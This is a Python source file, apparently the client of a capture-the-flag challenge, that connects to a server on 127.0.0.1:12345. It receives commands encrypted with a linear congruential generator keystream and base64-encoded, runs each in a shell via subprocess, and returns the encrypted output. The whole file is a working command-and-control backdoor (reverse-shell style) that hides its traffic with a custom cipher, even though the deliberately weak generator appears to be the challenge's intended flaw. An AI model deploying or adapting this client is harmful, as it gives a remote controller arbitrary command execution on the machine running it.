import pwn
import parameters
import secret
import socket
import base64
import subprocess
import json

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 12345

class LCG:
    def __init__(self):
        self.state = secret.seed
        self.a = parameters.a
        self.c = parameters.c
        self.m = parameters.m

    def nextGeneration(self):
        self.state = (self.a * self.state + self.c) % self.m
        return self.state

    def genKeyXor(self, length):
        key = bytearray()
        for i in range(length):
            part = self.nextGeneration()
            key += ((part >> ((part.bit_length() - 8) if part.bit_length() > 8 else 0)) & 0xFF).to_bytes(1, 'big')
        return bytes(key)

    def encrypt(self, msg):
        return pwn.xor(msg.encode(), self.genKeyXor(len(msg)))
    
    def decrypt(self, encrypted_msg):
        return pwn.xor(encrypted_msg, self.genKeyXor(len(encrypted_msg))).decode()

def execute_command(command):
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    return result

def start_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))
    print(f"[+] Connecté au serveur {SERVER_HOST}:{SERVER_PORT}")

    lcg = LCG()

    while True:
        encrypted_command = client.recv(1024)
        json_data = json.loads(encrypted_command.decode())
        base64_command = json_data["cmd"]
        command = lcg.decrypt(base64.b64decode(base64_command))
        output = execute_command(command)
        encrypted_response = lcg.encrypt(output)
        client.send(base64.b64encode(encrypted_response))

    client.close()
    print("[*] Connexion fermée.")

if __name__ == "__main__":
    start_client()
